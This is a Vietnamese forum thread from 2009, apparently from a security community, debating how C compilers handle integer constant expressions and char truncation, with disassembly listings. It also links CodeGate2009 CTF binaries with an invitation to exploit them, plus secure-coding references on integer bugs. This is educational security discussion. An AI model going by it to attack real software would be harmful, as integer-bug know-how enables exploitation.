Như vậy là sau bước pre-processing, MAX-LEN-10 đã được compiler chuyển thành (int)256 và (char)-10
ASM code không có 1 lệnh tính toán nào khác nữa.

Vậy nếu như asm code ra tương tự như:
- tính 256-10 rồi gán vào 1 thanh ghi 4 bytes
- gán byte thấp nhất của thanh ghi này vào c
thì lập chứng của bạn choc_ là đúng (MAX_LEN - 1 là int và các bit cao bị bỏ đi khi gán vào kiểu char).

Tuy nhiên ở đây compiler lại không sinh ra lệnh nào cho phép tính 256-10 mà asm code ra thằng luôn: <b>movb</b>    $-10, -5(%ebp). Như vậy thì luận chứng của bạn choc_ chưa thể kiểm chứng được (tôi không nói là sai nhé).

(edit: remove 1 phần ghi sai).]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171645</guid>
				<link>/hvaonline/posts/list/27801.html#171645</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 13:07:45]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">nbthanh wrote:</cite><br>
		<blockquote>Tuy nhiên ở đây compiler lại không sinh ra lệnh nào cho phép tính 256-10 mà asm code ra thằng luôn: <b>movb</b>    $-10, -5(%ebp). Như vậy thì luận chứng của bạn choc_ chưa thể kiểm chứng được (tôi không nói là sai nhé).&nbsp;
		</blockquote>
Nói rõ thêm điểm này 1 chút: làm sao để kiểm chứng được là với câu lệnh:
c = MAX_LEN - 10; (c = 256-10) thì compiler sẽ thực hiện:
c = (char)((int)256 - (int)10)
hay là c = (char)256 - (char)10]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171651</guid>
				<link>/hvaonline/posts/list/27801.html#171651</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 14:00:58]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @nbthanh: mình không rõ bạn không hiểu thật hay vì lý do gì đó mà cố tình không hiểu. Việc tại sao compiler ra được giá trị -10, và ghi thẳng vào vùng nhớ của biến c thì mình đã giải thích ở trên rồi. Mình giải thích cách compiler sẽ phải làm từng bước, khi muốn xác định kiểu của biểu thức MAX_LEN - 10, nhưng không có nghĩa là compiler bắt buộc phải sinh mã cho từng bước đó. 

Nếu mình tính được c, thì người viết compiler cũng sẽ tính được c, vậy thì tội dại gì phải sinh mã trung gian (nhất là khi vế phải chỉ là một integer constant expression)?  Đây chỉ là một bước tối ưu mã rất bình thường mà bất kỳ ai viết compiler cũng phải nghĩ đến.

Mình chưa làm thử, nhưng mình đồ là thay vì gán trực tiếp MAX_LEN - 1 cho c, bạn thử ép kiểu từ i qua c, thì bạn sẽ thấy đoạn mã mà bạn đang tìm, bởi lúc này vế phải không còn là một integer constant expression nữa rồi.

Mà thôi, mình làm luôn cho bạn coi nè (compiled bằng gcc-4.x trên linux-x86):

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>i = MAX_LEN-10;
c = &#40;char&#41; i;
.....
0x08048385 &lt;main+17&gt;:	movl   $0xf6,-0xc&#40;%ebp&#41;
0x0804838c &lt;main+24&gt;:	mov    -0xc&#40;%ebp&#41;,%eax
0x0804838f &lt;main+27&gt;:	mov    %al,-0x5&#40;%ebp&#41;</pre>
		</div>

Ở cái lệnh assembly đầu tiên, do tính được giá trị của MAX_LEN - 10, nên compiler nó ghi luôn  vào ô nhớ của i. Ở 2 lệnh tiếp theo, compiler nó thực hiện cái mà bạn nbthanh đang tìm kiếm.

Mình cũng không tự dưng dựa vào một hai quan sát (mà mình cũng đã dùng luật để giải thích ngọn ngành) mà phán như bạn, mình nói có sách, mách có chứng đàng hoàng, bạn cố tình không chịu đọc chứng cứ mình đưa ra đó thôi.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171652</guid>
				<link>/hvaonline/posts/list/27801.html#171652</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 14:02:10]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">nbthanh wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">nbthanh wrote:</cite><br>
		<blockquote>Tuy nhiên ở đây compiler lại không sinh ra lệnh nào cho phép tính 256-10 mà asm code ra thằng luôn: <b>movb</b>    $-10, -5(%ebp). Như vậy thì luận chứng của bạn choc_ chưa thể kiểm chứng được (tôi không nói là sai nhé).&nbsp;
		</blockquote>
Nói rõ thêm điểm này 1 chút: làm sao để kiểm chứng được là với câu lệnh:
c = MAX_LEN - 10; (c = 256-10) thì compiler sẽ thực hiện:
c = (char)((int)256 - (int)10)
hay là c = (char)256 - (char)10&nbsp;
		</blockquote>

Thì tại chuẩn (với lại tại hai khứa K&R) yêu cầu phải thực hiện cái đầu tiên chứ sao, khổ thât. Mà thật ra nếu bạn có ghi biểu thức [b]c = (char)256 - (char)10[b/] thì compiler cũng sẽ thực hiện tuần tự các bước sau đây (thấy có vẻ quái dị):

1. Gán kiểu int cho 256 và 10 (do luật xử lý integer constant)

2. Ép kiểu 256 và 10 xuống thành char (do luật simple conversion)

3. Nâng lên int hai số vừa ép xuống char (do luật integer promotion)

4. Tính ra giá trị (kiểu int) của vế phải

5. Ép giá trị này từ int xuống char, và gán lại cho c.

Chứ nó sẽ không như bạn nghĩ (mình đoán bạn đang nghĩ vậy) là ép kiểu xuống char, trừ phát, rồi assign luôn. Mà bạn cũng lưu ý ghi (char) 256 nghĩa là ép kiểu, mà muốn ép kiểu thì 256 phải có kiểu rồi, và kiểu đó là int.

Dẫu vậy mình nghĩ suy nghĩ của bạn là có lý, nhưng tại sao C lại không làm như bạn nghĩ, thì đơn giản vì hai khứa K&R không thích thế. Nếu bạn nghĩ cách của bạn hay hơn, thì bạn tự viết compiler rồi ra chuẩn riêng cho mình nha.

Vậy thôi, dừng tranh luận vấn đề này nha, mình chán rồi. Bạn không chịu đọc những gì mình viết và tài liệu mình gửi lên đây.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171661</guid>
				<link>/hvaonline/posts/list/27801.html#171661</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 15:22:31]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Nếu mình tính được c, thì người viết compiler cũng sẽ tính được c, vậy thì tội dại gì phải sinh mã trung gian (nhất là khi vế phải chỉ là một integer constant expression)?  Đây chỉ là một bước tối ưu mã rất bình thường mà bất kỳ ai viết compiler cũng phải nghĩ đến.&nbsp;
		</blockquote>
Để <b>kiểm chứng</b> cách compiler xử lý 1 integer constant expression, tôi đã <i>cố tình dùng -O0</i> để tắt optimization đi. Vấn đề/mục đích chính ở đây là <b>kiểm chứng</b> chứ không phải là vấn đề compiler có biết tối ưu hay không (nếu không tôi đã không cố tình dùng -O0). Nhưng có lẽ -O0 vẫn không "ngăn cản" được bước tối ưu này.

<p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>@nbthanh: mình không rõ bạn không hiểu thật hay vì lý do gì đó mà cố tình không hiểu. Việc tại sao compiler ra được giá trị -10, và ghi thẳng vào vùng nhớ của biến c thì mình đã giải thích ở trên rồi. Mình giải thích cách compiler sẽ phải làm từng bước, khi muốn xác định kiểu của biểu thức MAX_LEN - 10, nhưng không có nghĩa là compiler bắt buộc phải sinh mã cho từng bước đó. &nbsp;
		</blockquote>
Ở đây, vì mục đích chính là kiểm chứng nên đầu tiên tôi đã thử tắt optimization đi để xem các bước trung gian compiler sinh mã thế nào. Nhưng như kết quả thực tế thì không có mã trung gian mà chỉ có kết quả cuối cùng.

Vậy có kết quả cuối cùng (gọ là Z), và ta có 1 số luập luận: "tính tay" dựa theo lập luận ra kết quả (Z'). So sánh Z với Z' ta sẽ biết được là lập luận của ta đúng hay sai.
Tuy nhiên, vì không có bước trung gian do compiler sinh ra, ta có 2 lập luận:

(1) c = (char)((int)256 - (int)10) (= kết quả cuối cùng là Z')
(2) và c = (char)256 - (char)10 (= kết quả cuối cùng là Z'')

"Chẳng may" ở đây Z' = Z'' <b>và</b> chúng ta không có các bước trung gian (mà chúng ta expect là compiler sẽ sinh ra).

Vậy, nếu với mục đích là kiểm chứng, thì nó là (1) hay (2)?
]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171664</guid>
				<link>/hvaonline/posts/list/27801.html#171664</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 15:36:48]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Thì tại chuẩn (với lại tại hai khứa K&R)...
Chứ nó sẽ không như bạn nghĩ...
Vậy thôi, dừng tranh luận vấn đề này nha, mình chán rồi. Bạn không chịu đọc những gì mình viết và tài liệu mình gửi lên đây.&nbsp;
		</blockquote>
Post xong bài trước mới thấy bài này.
Tôi thì lại nghĩ mục đích của bạn tạo topic này lại là vì để "thảo luận" về các vấn đề này đấy chứ?

Vì nếu...cái gì cũng <b>y khuông như mình nghĩ</b> thì làm gì có lỗi ;-) Bởi vì có những cái trên thực tế "có thể" nó không như vậy (đang tìm 1 mechanism để kiểm chứng) nên nó mới có thể có những lỗi mà <b>"nhìn vậy, nghĩ vậy chứ không phải vậy"</b>.
Không phải mục đích của topic bạn lập ra là thế sao? ;-)]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171665</guid>
				<link>/hvaonline/posts/list/27801.html#171665</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 15:40:44]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @nbthanh: không phải chẳng may mà hai cái bạn tính nó ra kết quả giống nhau đâu, tự vì nó bắt buộc phải giống nhau, bạn thử lấy giấy viết ra tính thử xem sẽ thấy.

Mình có làm một chương trình nhỏ thế này, mong là bạn nbthanh sẽ đồng ý với những luận điểm ở trên của mình sau khi xem chương trình này:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define MAX_LEN 256

int main&#40;int argc, char **argv&#41;
{
         short i;
         i = MAX_LEN-10;
         printf&#40;"%d %d\n", i, sizeof&#40;MAX_LEN-10&#41;&#41;;
         return 0;
}</pre>
		</div>

Lưu ý là mình đổi i từ int sang short, để bạn nbthanh thấy là compiler cũng bỏ bước trung gian ở trường hơp này luôn. Lưu ý thứ hai là sizeof(MAX_LEN-10) là 4.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171757</guid>
				<link>/hvaonline/posts/list/27801.html#171757</link>
				<pubDate><![CDATA[Tue, 3 Mar 2009 12:25:16]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>@nbthanh: không phải chẳng may mà hai cái bạn tính nó ra kết quả giống nhau đâu, tự vì nó bắt buộc phải giống nhau, bạn thử lấy giấy viết ra tính thử xem sẽ thấy.

Mình có làm một chương trình nhỏ thế này, mong là bạn nbthanh sẽ đồng ý với những luận điểm ở trên của mình sau khi xem chương trình này:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define MAX_LEN 256

int main&#40;int argc, char **argv&#41;
{
         short i;
         i = MAX_LEN-10;
         printf&#40;"%d %d\n", i, sizeof&#40;MAX_LEN-10&#41;&#41;;
         return 0;
}</pre>
		</div>

Lưu ý là mình đổi i từ int sang short, để bạn nbthanh thấy là compiler cũng bỏ bước trung gian ở trường hơp này luôn. Lưu ý thứ hai là sizeof(MAX_LEN-10) là 4.&nbsp;
		</blockquote>
Vấn đề chính là ở chỗ đó: nó không có bước trung gian --&gt; không <b>kiểm chứng</b> được mà chỉ có thể dùng các rule trong spec để <b>dự đoán</b>.

Nhưng nói chung thì tôi cũng chỉ nêu ra vấn đề để chúng ta có thêm 1 hướng để suy nghĩ, để đào sâu. Chẳng hạn như Mr.X là người maintain cái C/C++ spec, Mr.Y nào đó viết ra ycc và nói là ycc của tôi theo đúng spec.
Giờ ngoại trừ cách mở code của ycc ra coi, có cách nào viết được unit test để có thể kiểm chứng rằng ycc làm theo đúng spec? Ít nhất không kiểm chứng được hết thì cũng làm được phần lớn.
Ở đây có 1 trường hợp mà tôi nêu ra đó: dĩ nhiên đọc spec và suy luận thì ra, nhưng <b>làm sao kiểm chứng</b>?

Thực ra thì ở phần 6.4.8. Processing numbers của C99 có nói:
"A preprocessing number does not have type or a value; it acquires both after a successful
conversion (as part of translation phase 7) to a floating constant token or an integer
constant token".

Như vậy nếu ghi short s = MAX_LEN thì bước preprocessing MAX_LEN sẽ là 256 và tại thời điểm này <b>nó chưa có type</b>. Compiler sẽ thử convert 256 sang "floating constant token" hoặc "integer constant token" rồi mới quyết định kiểu cho nó. Tôi cũng nghĩ rằng compiler chọn và convert sang token nào thì lại tùy vào ngữ cảnh lúc đó.

Tuy nhiên vẫn còn 1 chút khúc mắc nhỏ: s = MAX_LEN-10 thì ở bước preprocessing sẽ là s = 256-10 và mã sinh ra lại là mov 246,...?
Do vậy tôi cũng cho rằng 256-10 được xử lý thành 246 vẫn nằm ở bước pre-processing (vẫn hợp lý vì optimization có xảy ra trong giai đoạn pre-processing).
Và như thế, thì 246 ở giai đoạn này chưa có kiểu int (theo section 6.4.8), vậy cũng có thể nói là MAX_LEN-10 tới thời điểm này vẫn chưa có kiểu là int!
Sau khi xong bước này, compiler mới quyết định kiểu cho 246 (cũng tức là MAX_LEN-1): lúc này thì compiler lại xem xét tới vấn đề ngữ cảnh.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171769</guid>
				<link>/hvaonline/posts/list/27801.html#171769</link>
				<pubDate><![CDATA[Tue, 3 Mar 2009 13:31:26]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Mình có một lưu ý thế này, tại vì mình thấy có nhiều chỗ các bạn nói rằng giá trị của constant expression (vd. MAX_LEN - 10) được tính toán ở bước pre-processing, nhưng theo mình biết thì các compilers hiện đại làm việc này ở bước compilation, còn bước pre-processing chỉ thay giá trị MAX_LEN bằng giá trị được define trong code.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171772</guid>
				<link>/hvaonline/posts/list/27801.html#171772</link>
				<pubDate><![CDATA[Tue, 3 Mar 2009 13:42:49]]> GMT</pubDate>
				<author><![CDATA[ StarGhost]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">StarGhost wrote:</cite><br>
		<blockquote>Mình có một lưu ý thế này, tại vì mình thấy có nhiều chỗ các bạn nói rằng giá trị của constant expression (vd. MAX_LEN - 10) được tính toán ở bước pre-processing, nhưng theo mình biết thì các compilers hiện đại làm việc này ở bước compilation, còn bước pre-processing chỉ thay giá trị MAX_LEN bằng giá trị được define trong code.&nbsp;
		</blockquote>
Cảm ơn bạn đã lưu ý, tôi nghĩ là tôi dùng hơi sai ngữ nghĩa của "pre-processing" 1 chút.
Nhưng nó cũng phải ở trước bước sinh mã cuối cùng - có lẽ là trong "translation phase 7" hoặc trước đó.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171776</guid>
				<link>/hvaonline/posts/list/27801.html#171776</link>
				<pubDate><![CDATA[Tue, 3 Mar 2009 13:50:06]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @nbthanh: rất vui là cuối cùng bạn cũng đã đọc cái spec. Mình thấy cái 6.4.8 nó đã ghi rõ rồi mà, mấy cái preprocessing number sẽ chỉ có hai kiểu: hoặc là float hoặc là integer, nó đâu có ghi là sẽ phụ thuộc vào ngữ cảnh đâu bạn :-p. Việc convert một token sang loại token nào chỉ phụ thuộc vào cái literal string của token đó thôi, không hề phụ thuộc vào ngữ cảnh. Đây là kiến thức cơ bản của môn compiler mà phải không? Rồi từ loại token, người ta mới suy ra kiểu của token đó. Cái này mình đã nói ở trên rồi, kiểu của MAX_LEN sẽ là int.

Nếu MAX_LEN là int, thì biểu thức MAX_LEN - 1 sẽ có kết quả thuộc kiểu int (như mình đã chứng minh bằng sizeof). Đây cũng là điểm mà mình muốn nói đến từ đầu. Thậm chí sizeof(MAX_LEN - 1) cũng bị dịch một phát thành movel 0x4, $eax, nghĩa là compiler nó tính ra giá trị cụ thể (mình nghĩ là nó làm ở bước translation 7), rồi ghi luôn vào register, chứ không hề sinh mã trung gian.

Nếu không lầm thì mình đã đưa ra một ví dụ có mã trung gian cho bạn rồi. Chắc là bạn bỏ sót, giờ mình đưa ra một ví dụ mà mình vừa mới nghĩ ra:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>int main&#40;int argc, char **argv&#41;
{
         int i;
         i = MAX_LEN-10;
         char c = &#40;char&#41;&#40;MAX_LEN - 10&#41;;
         printf&#40;"%d %d %d\n", i, c&#41;;
         return 0;
 }</pre>
		</div>

Nhìn vào cái char c = (char)(MAX_LEN - 10); thì nếu mà tính như bạn nghĩ, char c = (char) ((char)MAX_LEN  - (char)10)); nói cách khác compiler xem MAX_LEN là char, 10 là char, tính ra kết quả, rồi gán luôn cho char, thì việc convert (char) một lần nữa ở biểu thức (MAX_LEN - 10) sẽ không có ý nghĩa. Nên compiler sẽ phải output dạng như bạn nbthanh suy đoán, mov -10, register.

Dẫu vậy lúc disassembly thì mình thấy gì?

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>0x08048385 &lt;main+17&gt;:	movl   $0xf6,-0xc&#40;%ebp&#41;
0x0804838c &lt;main+24&gt;:	movb   $0xf6,-0x5&#40;%ebp&#41;</pre>
		</div>

Thấy cái movb không bạn? Nó đưa vào 0xf6 = 246 (nó sẽ không ra được giá trị này nếu như nó áp dụng cách tính của bạn) luôn, nhưng chỉ move một byte cuối thôi. Không hề xuất hiện cái -10 như bạn nghĩ :-D. 

Nếu mình đổi short c = (short)(MAX_LEN - 1), thì compiler sẽ output:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>short c = &#40;short&#41;&#40;MAX_LEN - 1&#41;
...
0x0804838c &lt;main+24&gt;:	movw   $0xf6,-0x6&#40;%ebp&#41;</pre>
		</div>

Rõ ràng hai ví dụ này chứng minh rất rõ là MAX_LEN - 1 sẽ có kiểu là integer (nó mới tính ra được cái giá trị 0xf6). Đấy, mình nghĩ từ đầu đến giờ, hai ví dụ này là convincing nhất. Bạn nbthanh mà không đồng ý nữa thì mình ráng tìm cái khác nữa vậy.

Dẫu vậy, mình cũng cảm ơn bạn nbthanh là nhờ có bạn thắc mắc kỳ cục mà mình có dịp hiểu hơn về vấn đề này.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171792</guid>
				<link>/hvaonline/posts/list/27801.html#171792</link>
				<pubDate><![CDATA[Tue, 3 Mar 2009 14:58:31]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Thấy cái movb không bạn?...&nbsp;
		</blockquote>
Thấy, và thấy rất rõ!

<p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Nó đưa vào 0xf6 = 246&nbsp;
		</blockquote>
<b>0xf6 = -10, không phải là 246!</b>

Các compiler như gcc, bcc có option -S để sinh ra mã asm trung gian. Sử dụng option này bạn sẽ thấy cách mà compiler hiểu & xử lý biên dịch chương trình.
Với đoạn mã:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>int i;
char c;
long int l;

i = &#40;int&#41;&#40;MAX_LEN - 10&#41;;
c = &#40;char&#41;&#40;MAX_LEN - 10&#41;;
l = &#40;long&#41;&#40;MAX_LEN - 10&#41;;</pre>
		</div>

Max asm sinh ra:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>movl    $246, -16&#40;%ebp&#41;
movb    $-10, -9&#40;%ebp&#41;
movl    $246, -8&#40;%ebp&#41;</pre>
		</div>

Thấy rõ ràng là -10 (và binary code của nó là 0xf6)

<p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>@nbthanh: rất vui là cuối cùng bạn cũng đã đọc cái spec. Mình thấy cái 6.4.8 nó đã ghi rõ rồi mà...&nbsp;
		</blockquote>
Tôi thì ngược lại, rất buồn là bạn _đã_ đọc cái spec ;-)

P/S:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>char c = 1L;</pre>
		</div>
sinh ra mã asm:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>movb    $1, -9&#40;%ebp&#41;</pre>
		</div>

(edit: sửa chỗ ghi nhầm 10 thành -10).]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171849</guid>
				<link>/hvaonline/posts/list/27801.html#171849</link>
				<pubDate><![CDATA[Wed, 4 Mar 2009 01:11:54]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Hôm nay có bạn gửi cho 3 cái binary, một phần của CodeGate2009, nói là có liên quan đến đề tài đang thảo luận ở đây. Mình xem thử qua, thấy đúng thế thiệt. Mời các bạn nhào vào exploit nha:

1. hotdog: http://www.mediafire.com/?jtcd5iyhomv

2. sandwich: http://www.mediafire.com/?znuf2wt4tuo

3. hamburger: http://www.mediafire.com/?znuf2wt4tuo]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#172772</guid>
				<link>/hvaonline/posts/list/27801.html#172772</link>
				<pubDate><![CDATA[Tue, 10 Mar 2009 19:47:21]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Hôm nay có bạn gửi cho 3 cái binary, một phần của CodeGate2009, nói là có liên quan đến đề tài đang thảo luận ở đây. Mình xem thử qua, thấy đúng thế thiệt. Mời các bạn nhào vào exploit nha:

1. hotdog:<span class="link"> http://www.mediafire.com/?jtcd5iyhomv</span>

2. sandwich:<span class="link"> http://www.mediafire.com/?znuf2wt4tuo</span>

3. hamburger:<span class="link"> http://www.mediafire.com/?znuf2wt4tuo&nbsp;</span>
		</blockquote>

2 link cuối giống nhau kìa bạn . :D ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#172773</guid>
				<link>/hvaonline/posts/list/27801.html#172773</link>
				<pubDate><![CDATA[Tue, 10 Mar 2009 19:53:43]]> GMT</pubDate>
				<author><![CDATA[ secmask]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ http://www.mediafire.com/download.php?zymq4nzn2yl]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#172775</guid>
				<link>/hvaonline/posts/list/27801.html#172775</link>
				<pubDate><![CDATA[Tue, 10 Mar 2009 20:10:44]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Mình mới tìm được một số tài liệu khá hay trên mạng về đề tài này, các bạn tham khảo nha:

1. Chương 6 - C language issues của The Art of Software Security Assessment (được xem là sách gối đầu giường của những ai muốn nghiên cứu việc tìm lỗi trong phần mềm, một trong rất ít cuốn sách làm thay đổi cả ngành an toàn thông tin): http://www.awprofessional.com/content/images/0321444426/samplechapter/Dowd_ch06.pdf.

Chương 6 này viết rất chi tiết về các vấn đề thường gặp khi lập trình bằng ngôn ngữ C.

2. Chương 5 của cuốn "Secure Coding in C and C++", tác giả là Robert Seacord, chuyên gia về viết mã an toàn của CERT: http://www.awprofessional.com/content/images/0321335724/samplechapter/seacord_ch05.pdf

Chương 5 này viết rất chi tiết về các vấn đề liên quan đến số nguyên. Khác với cuốn ở trên, Seacord còn đưa ra một số biện pháp để viết mã an toàn hơn.

3. Tham khảo thêm tài liệu https://www.securecoding.cert.org/confluence/display/seccode/CERT+C+Programming+Language+Secure+Coding+Standard. Trong đây họ liệt kê tất cả các dạng lỗi thường gặp khi viết bằng C, và cách sửa chương trình để không bị lỗi nữa.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#173174</guid>
				<link>/hvaonline/posts/list/27801.html#173174</link>
				<pubDate><![CDATA[Sat, 14 Mar 2009 01:09:36]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Hay lắm, cảm ơn choc_]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#173180</guid>
				<link>/hvaonline/posts/list/27801.html#173180</link>
				<pubDate><![CDATA[Sat, 14 Mar 2009 02:39:36]]> GMT</pubDate>
				<author><![CDATA[ Z0rr0]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ mắc cười quá, hôm nay mới xem được một cái tin thế này:

<p></p>
		<cite class="blockquote">http://www.cbc.ca/consumer/story/2009/03/17/slot.html wrote:</cite><br>
		<blockquote>
    According to the statement, Kusznirewicz was playing an OLG slot machine called Buccaneer at Georgian Downs in Innisfil, Ont., on Dec. 8 when it showed he had won $42.9 million.

    When the machine’s winning lights and sounds were activated, an OLG floor attendant initially told Kusznirewicz to go to the “winners circle” to claim his prize, according to the statement. But other OLG employees immediately arrived and told him that the corporation would not be paying, because there had been a “machine malfunction.”

    They offered him a free dinner for four at the casino’s buffet.

In a press release, OLG described the malfunction as follows:

    “The single Buccaneer-themed slot machine in question is a two cent per play machine with a base game reward of $300 and an absolute maximum payout of $9,025,” the release states.

    “The $42 million figure is not a possible award given this machine’s configuration and pay table settings.”
&nbsp;
		</blockquote>

Mấy khứa ở Veracode mới đưa ra một giả thuyết như sau về cái code của mấy cái máy lotto này:

<blockquote>

Of course the lawsuit will probably be thrown out, or OLG will settle with the guy for a lesser amount. But from a technical perspective, it’s amusing to think about what happened to cause this scenario. You can imagine the slot machine software looking something like this:

void do_spin() {
  spin_reels();
  if (winning_combination) {
    unsigned int winnings = calculate_payout_in_cents();
    send_to_display("You've won $%u!\n", winnings/100);
    add_to_balance(winnings/100);
  }
}

int calculate_payout_in_cents() {
  int rv;
  if (rv = lookup_payout_amount())
    return rv;
  else
    return -1;
}

For some reason, something caused lookup_payout_amount() to return NULL, which meant calculate_payout() returned -1, signifying an error. Then, in addition to implicitly casting the signed result to an unsigned type, do_spin() fails to check for the error condition! It assumes success and announces the payout via the slot machine’s display. In this case, the -1, represented as 0xFFFFFFFF in two’s complement, gets interpreted as an unsigned number, 4294967295, due to the implicit cast, and the display prints “You’ve won $42949672!”

&nbsp;
		</blockquote>

Hehehe rõ ràng các vấn đề liên quan đến số nguyên rất nguy hiểm nha.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#175459</guid>
				<link>/hvaonline/posts/list/27801.html#175459</link>
				<pubDate><![CDATA[Tue, 31 Mar 2009 02:51:50]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[    Đọc xong chủ đề này em cảm thấy rất hay mặc dù với kiến thức hiện tại em chẳng hiểu được gì, em rất muốn tìm hiểu để nắm rõ hơn,sâu hơn về ngôn ngữ mà em đang học đó là C++ 
   
    Vì vậy em có 1 vài câu hỏi ( xin lỗi vì em hỏi tại đây, nơi các anh bàn về C , nhưng em nghĩ tương tự) , đó là:

    - Có phải các anh đang bàn luận về ' diassembly' không ạ, em thấy khi biên dịch 1 chương trình C++ nào đó, trình biên dịch không hiển thị lỗi ( em thường hay gặp ở các bài cấp phát động, hay con trỏ, tham chiếu) ,  vẫn chạy nhưng báo lỗi bộ nhớ ( hay thường là thông báo close chương trình (incorrect, invalid)) hoặc nếu trong máy tồn tại một trình debug nào đó thì nó hỏi mình có debug hay không, khi em chọn debug( máy có Visual Studio 2008) thì sẽ hiện ra 1 bảng thông báo thế này:
    
   <font color='red'> Unhandled exception at 0x004013c4 in contro.exe: 0xC0000005: Access violation reading location 0x00000000.</font>

    Hỏi chọn Break, Continue và Ignore , khi nhấn vào Continue thì nó hiện lại bảng thông báo này. Khi chọn Break thì hiện ra 1 tab gọi là 'Diassembly' chứa một dãy rất dài các câu lệnh Assembly.

